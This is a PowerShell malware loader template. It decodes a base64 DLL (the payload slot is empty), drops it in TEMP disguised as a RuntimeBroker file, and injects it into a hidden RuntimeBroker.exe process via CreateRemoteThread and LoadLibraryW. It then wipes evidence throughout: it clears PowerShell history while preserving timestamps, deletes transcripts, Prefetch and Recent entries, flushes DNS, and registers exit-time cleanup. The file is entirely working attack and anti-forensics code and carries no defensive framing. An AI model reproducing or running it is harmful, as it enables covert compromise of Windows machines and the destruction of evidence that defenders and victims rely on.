# loader_template.ps1 - VPS: base64 DLL -> TEMP -> inject -> clean traces
$ErrorActionPreference = 'SilentlyContinue'
if ([IntPtr]::Size -ne 8) { return }

if (-not ('XG.N' -as [type])) {
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
namespace XG {
    public static class N {
        [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr OpenProcess(uint a, bool i, uint pid);
        [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr addr, UIntPtr sz, uint t, uint p);
        [DllImport("kernel32.dll", SetLastError=true)] public static extern bool WriteProcessMemory(IntPtr h, IntPtr addr, byte[] buf, UIntPtr sz, out UIntPtr w);
        [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr sa, UIntPtr st, IntPtr start, IntPtr par, uint fl, IntPtr tid);
        [DllImport("kernel32.dll", SetLastError=true)] public static extern uint WaitForSingleObject(IntPtr h, uint ms);
        [DllImport("kernel32.dll", SetLastError=true)] public static extern bool GetExitCodeThread(IntPtr h, out uint code);
        [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
        [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)] public static extern bool MoveFileExW(string e, string n, uint f);
        [DllImport("kernel32.dll", CharSet=CharSet.Ansi)] public static extern IntPtr GetModuleHandleA(string n);
        [DllImport("kernel32.dll", CharSet=CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr m, string n);
    }
}
'@
}

function Invoke-NoveInject {
    param([string]$DllPath)

    $hostProc = $null
    try {
        $fresh = Start-Process (Join-Path $env:SystemRoot 'System32\RuntimeBroker.exe') -PassThru -WindowStyle Hidden -EA Stop
        Start-Sleep -Milliseconds 400
        if ($fresh -and (Get-Process -Id $fresh.Id -EA SilentlyContinue)) { $hostProc = $fresh }
    } catch {}
    if (-not $hostProc) {
        $hostProc = Get-Process RuntimeBroker -EA SilentlyContinue | Sort-Object StartTime -Descending | Select-Object -First 1
    }
    if (-not $hostProc) { return @{ Ok = $false; Pid = 0 } }

    $hProc = [XG.N]::OpenProcess(0x1F0FFF, $false, [uint32]$hostProc.Id)
    if ($hProc -eq [IntPtr]::Zero) { return @{ Ok = $false; Pid = 0 } }

    $pathBytes = [Text.Encoding]::Unicode.GetBytes($DllPath + [char]0)
    $sz = [UIntPtr]([uint64]$pathBytes.Length)
    $remote = [XG.N]::VirtualAllocEx($hProc, [IntPtr]::Zero, $sz, 0x3000, 0x04)
    if ($remote -eq [IntPtr]::Zero) {
        [XG.N]::CloseHandle($hProc) | Out-Null
        return @{ Ok = $false; Pid = 0 }
    }

    $w = [UIntPtr]::Zero
    [XG.N]::WriteProcessMemory($hProc, $remote, $pathBytes, $sz, [ref]$w) | Out-Null
    $ll = [XG.N]::GetProcAddress([XG.N]::GetModuleHandleA('kernel32.dll'), 'LoadLibraryW')
    $thr = [XG.N]::CreateRemoteThread($hProc, [IntPtr]::Zero, [UIntPtr]::Zero, $ll, $remote, 0, [IntPtr]::Zero)
    if ($thr -eq [IntPtr]::Zero) {
        [XG.N]::CloseHandle($hProc) | Out-Null
        return @{ Ok = $false; Pid = 0 }
    }

    [XG.N]::WaitForSingleObject($thr, 15000) | Out-Null
    $code = [uint32]0
    [XG.N]::GetExitCodeThread($thr, [ref]$code) | Out-Null
    [XG.N]::CloseHandle($thr) | Out-Null
    [XG.N]::CloseHandle($hProc) | Out-Null
    if ($code -ne 0) { return @{ Ok = $true; Pid = $hostProc.Id } }
    return @{ Ok = $false; Pid = 0 }
}

function Remove-NoveHistory {
    $hf = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (-not (Test-Path $hf)) { return }
    $enc = New-Object System.Text.UTF8Encoding($false)
    for ($pass = 0; $pass -lt 3; $pass++) {
        if ($pass -gt 0) { Start-Sleep -Milliseconds 500 }
        try {
            $fi = Get-Item $hf
            $wt = $fi.LastWriteTime; $at = $fi.LastAccessTime; $ct = $fi.CreationTime
            [IO.File]::WriteAllText($hf, '', $enc)
            $fi = Get-Item $hf
            $fi.LastWriteTime = $wt; $fi.LastAccessTime = $at; $fi.CreationTime = $ct
        } catch {}
    }
    try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
}

function Clear-NoveTraces {
    param([string]$TempPayload = '')

    Remove-NoveHistory
    Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\StartupProfileData-*" -Force -EA 0
    Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\VisualStudio*.txt" -Force -EA 0

    try { Set-PSReadLineOption -HistorySaveStyle SaveNothing } catch {}
    try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
    try { Clear-History -EA 0 } catch {}

    try { Stop-Transcript -EA 0 } catch {}
    Remove-Item "$env:USERPROFILE\Documents\PowerShell_transcript.*" -Force -EA 0
    Remove-Item "$env:USERPROFILE\Documents\*.ps1_transcript.*" -Force -EA 0

    if ($TempPayload -and (Test-Path $TempPayload)) {
        try {
            $fs = [IO.File]::Open($TempPayload, 'Open', 'ReadWrite', 'None')
            $fs.SetLength(0); $fs.Close()
        } catch {}
        try { Remove-Item $TempPayload -Force -EA 0 } catch {}
        try { [XG.N]::MoveFileExW($TempPayload, $null, 4) | Out-Null } catch {}
    }

    Get-ChildItem $env:TEMP -Filter 'RuntimeBroker_*.dll' -EA 0 | ForEach-Object {
        try { Remove-Item $_.FullName -Force -EA 0 } catch {}
        try { [XG.N]::MoveFileExW($_.FullName, $null, 4) | Out-Null } catch {}
    }
    Get-ChildItem $env:TEMP -Filter 'RuntimeBroker_*.tmp' -EA 0 | ForEach-Object {
        try { Remove-Item $_.FullName -Force -EA 0 } catch {}
        try { [XG.N]::MoveFileExW($_.FullName, $null, 4) | Out-Null } catch {}
    }
    Get-ChildItem $env:TEMP -Filter 'nove_*.dll' -EA 0 | ForEach-Object {
        try { Remove-Item $_.FullName -Force -EA 0 } catch {}
        try { [XG.N]::MoveFileExW($_.FullName, $null, 4) | Out-Null } catch {}
    }

    Get-ChildItem "$env:WINDIR\Prefetch" -Filter 'POWERSHELL*.pf' -EA 0 | Remove-Item -Force -EA 0
    Get-ChildItem "$env:WINDIR\Prefetch" -Filter 'RUNTIMEBROKER*.pf' -EA 0 | Remove-Item -Force -EA 0

    try { & ipconfig /flushdns 2>$null | Out-Null } catch {}

    try {
        $recent = [Environment]::GetFolderPath('Recent')
        Get-ChildItem $recent -EA 0 | Where-Object {
            $_.Name -match 'powershell|ps1|nove|NOVE|iwr|iex|d9store'
        } | Remove-Item -Force -EA 0
    } catch {}

    [GC]::Collect(2, [GCCollectionMode]::Forced, $true)
    [GC]::WaitForPendingFinalizers()
}

try { Set-PSReadLineOption -HistorySaveStyle SaveNothing } catch {}
try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
Remove-NoveHistory

Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action {
    try { & $global:NV_HistClean } catch {}
    if ($global:NV_TempDll) {
        try { Remove-Item $global:NV_TempDll -Force -EA 0 } catch {}
        try { [XG.N]::MoveFileExW($global:NV_TempDll, $null, 4) | Out-Null } catch {}
    }
    try { & $global:NV_DeepClean } catch {}
} | Out-Null

$global:NV_HistClean = ${function:Remove-NoveHistory}

$dllBytes = [Convert]::FromBase64String('')

if ($dllBytes.Length -lt 64 -or $dllBytes[0] -ne 0x4D) { Clear-NoveTraces; return }

$dllPath = Join-Path $env:TEMP ("RuntimeBroker_" + [guid]::NewGuid().ToString('N') + ".dll")
try { [System.IO.File]::WriteAllBytes($dllPath, $dllBytes) } catch { Clear-NoveTraces; return }

$inj = Invoke-NoveInject -DllPath $dllPath
if (-not $inj.Ok) {
    Remove-Item $dllPath -Force -EA 0
    Clear-NoveTraces -TempPayload $dllPath
    return
}

$global:NV_TempDll = $dllPath
$global:NV_DeepClean = ${function:Clear-NoveTraces}

$deadline = (Get-Date).AddSeconds(12)
do {
    if (Get-Process -Id $inj.Pid -EA SilentlyContinue) { break }
    Start-Sleep -Milliseconds 200
} while ((Get-Date) -lt $deadline)

Start-Sleep -Milliseconds 500
Remove-Variable dllBytes, dllPath, inj -EA 0
Remove-NoveHistory
try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
try { Remove-Item Function:\Invoke-NoveInject -Force -EA 0 } catch {}
try { Remove-Item Function:\Remove-NoveHistory -Force -EA 0 } catch {}

